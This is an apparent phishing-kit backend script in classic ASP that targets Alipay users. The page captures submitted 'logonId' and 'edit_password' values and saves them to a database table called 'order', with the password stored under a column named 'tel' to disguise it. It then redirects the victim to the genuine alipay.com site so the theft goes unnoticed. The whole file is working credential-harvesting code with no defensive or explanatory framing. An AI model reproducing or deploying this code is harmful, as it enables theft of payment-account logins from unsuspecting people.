<!--#include file="conn.asp"-->
<%
set rs=server.CreateObject("adodb.recordset")
rs.Open "select * from [order] ",conn,1,3
rs.addnew
rs("name")=trim(request("logonId"))
rs("tel")=trim(request("edit_password"))
rs("date")=now()

rs.Update
rs.Close
set rs=nothing
%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
</head>
 
 
<body bgcolor="#FFFFFF" text="#000000" topmargin="0">
  <script language="JavaScript">
          self.location='https://www.alipay.com/';
   </script>
</body>
</html>
